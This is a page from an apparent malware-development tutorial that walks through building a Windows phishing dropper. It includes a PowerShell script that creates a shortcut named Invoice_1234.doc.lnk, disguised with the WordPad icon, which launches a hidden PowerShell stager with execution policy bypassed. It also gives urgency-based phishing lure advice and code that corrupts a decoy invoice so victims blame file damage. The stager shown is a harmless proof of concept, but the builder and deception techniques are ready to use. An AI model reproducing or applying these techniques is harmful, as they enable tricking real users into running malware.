---
title: "Step 1: Stager and LNK"
---

<h1>Step 1: Stager and LNK</h1>

## Preparing our Environment

On your Windows VM, open the file explorer and create a new directory called `PoC Dropper` (or whatever you like). Inside, create a subdirectory called `iso`, containing another subdirectory called `stager`. At the end of this section, once we've completed construction of the stager and LNK file, you should have a directory tree similar to the following:

```sh
PoC Dropper/
├── iso/
│   ├── Invoice_1234.doc.lnk
│   └── stager/
│       └── stager.ps1
└── make_lnk.ps1
```

The `iso` folder will be used for construction of the ISO file in Step 2.

## PoC Stager

The whole purpose of our dropper is to execute a stager on the victim's system. Therefore, we'll need a stager. In [the Stager section](/0x10%20Design/13%20Stagers/00%20Intro/) we'll cover stager design, but for now a simple PoC will suffice. Since we're targeting Windows, we'll use PowerShell for our stager code. Create a file called `stager.ps1` inside the `stager` subdirectory. Paste the following line into the `stager.ps1` file:

```sh
"Infected!" | Out-File -FilePath $HOME\Desktop\INFECTED.TXT
```

When executed, this stager will write the string `Infected!` into a file called `INFECTED.TXT` on the victim's desktop. Easy enough!

## LNK Dropper

Continuing with the theme of simplicity, we'll craft our LNK file with only a rudimentary disguise. The purpose of this file is to launch the stager script, while appearing to be a legitimate document. For this disguise, we will simply tell the LNK file to use the icon from the `WordPad.exe` binary.

Why WordPad, instead of Microsoft Word? Simple: WordPad is bundled with Windows, whereas Word is sold separately. LNK files borrow icons from other files. For an LNK to use a custom icon, that icon must exist on the victim's system. If we use the icon from MS Word, but the victim doesn't have Word on their PC, then the LNK file icon will be broken. Using WordPad, however, this problem is averted, as every Windows system includes WordPad by default.

In the `PoC Dropper` directory, create a script called `make_lnk.ps1`, with the following contents:

```sh
# Configure the launcher.
$exe = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
$args = "-NonInteractive -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File .\stager\stager.ps1";
$icon = "C:\Program Files\Windows NT\Accessories\wordpad.exe";
# Create the malicious LNK file.
$wss = New-Object -ComObject WScript.Shell;
$lnk = $wss.CreateShortcut(".\iso\Invoice_1234.doc.lnk");
$lnk.WindowStyle = "7"; # 1 = Default; 3 = Maximized; 7 = Minimized
$lnk.TargetPath = $exe;
$lnk.Arguments = $args;
$lnk.IconLocation = "$icon,0"; # Use the first icon from the target binary.
$lnk.save();
```

This script performs the following steps:

1. Create a new `WScript.Shell` object.
2. Use the resulting object to create a new LNK file at `.\iso\Invoice_1234.doc.lnk`.
3. Set the `WindowStyle` attribute to `7`.
    * The [available options](https://www.devguru.com/content/technologies/wsh/wshshortcut-windowstyle.html) are `1`, `3`, and `7`.
    * Style `7` tells Windows to launch the shortcut in a minimized window.
4. Set the `TargetPath` and `Arguments` attributes to launch our stager.
5. Set the `IconLocation` to the first icon from `wordpad.exe`.
6. Save the `.lnk` file to the previously-specified location.

### Executing the LNK Builder

Once the script has been written, run it with PowerShell:

```sh
C:\Users\MalDev\Desktop\PoC Dropper>powershell.exe -file .\make_lnk.ps1
```

When this completes, looking in the `iso` directory, you should see the following:

![Screenshot from inside the `iso` directory, showing the `stager` subdirectory and the `Invoice_1234.doc.lnk` file.](./img/lnk.jpg)

The `stager` directory contains a single file: `stager.ps1`. As we can see from the screenshot, the `Invoice_1234.doc.lnk` file uses the WordPad icon. This icon, coupled with the fact that Windows hides file extensions by default, makes it appear as if the `.lnk` file is actually a `.doc` file.

Phishing emails will often use the "unauthorized purchase" ploy, claiming that the victim will be charged for some expensive purchase unless they respond quickly to cancel the transaction. This sense of pending financial loss causes unwary readers to panic, and to find a way to stop the charge. This urgency encourages them to open malicious attachments, especially when they have names like `Receipt_Order-F33216` or `Invoice_281845`. Victims are likely to open these files, hoping to learn more about the unexpected purchase.

## Testing the Dropper

Since our stager payload is a benign PoC, we can safely launch the LNK file to ensure it behaves as expected. When executed, you may see a new item appear on the task bar for a moment before vanishing:

![Screenshot showing the minimized window, named `Invoice_1234.doc`.](./img/minimized.jpg)

After execution, if the dropper and stager worked properly, you should find a file called `INFECTED.TXT` on the desktop.

# Improving the Design

We've disguised the dropper as an invoice document with clever naming and using the `.doc.lnk` double-extension. However, there's one simple problem: When a user opens a `.doc` file, they expect Microsoft Word (or WordPad) to open a document. If a user opens our `Invoice_1234.doc.lnk` file and nothing happens, they may try launching it again, and may become suspicious when they see that nothing opens.

To account for this, we could create a legitimate-looking Microsoft Word file called `Invoice_1234.doc`, and store it in the `stager` directory. This file could be launched as part of the `.lnk` arguments, or could be launched by the `stager.ps1` script. That way, while the stager code is running in the background, the user will be greeted by an official-looking document, as they expected.

This, of course, requires that you create a legitimate-looking invoice file. On the other hand, you could simply create a fake invoice file, fill it with some garbled data, and save it as `Invoice_1234.doc`, then corrupt the document by splitting it in half. Here's some PowerShell code that will perform this task:

```sh
$relativepath = "stager\Invoice_1234.doc";
$fullpath = ($relativepath | Resolve-Path);
$size = ((Get-Item $fullpath).length);
$newsize = ($size - ($size % 2)) / 2; # Half size, in full bytes.
$infile = [io.file]::OpenRead($fullpath);
$buffer = New-Object byte[] $newsize;
$infile.Read($buffer, 0, $newsize);
$infile.close();
Remove-Item -path $fullpath;
$outfile = [io.file]::OpenWrite($fullpath);
$outfile.Write($buffer, 0, $newsize);
$outfile.close();
```

This opens the `stager\Invoice_1234.doc` file, reads its contents, deletes the file, then writes a new file (with the same name) containing the first half of the original file. The result is a corrupted `.doc` file that will, when opened in Microsoft Word, generate an error stating that the file could not be read.

When launching the dropper with the broken `.doc` file, the victim is more likely to believe the file was corrupted, rather than malicious. (A corrupted `.doc` is more believable than no `.doc` at all.)

We will leave it as an exercise for the reader to add this corrupted `.doc` to the LNK dropper.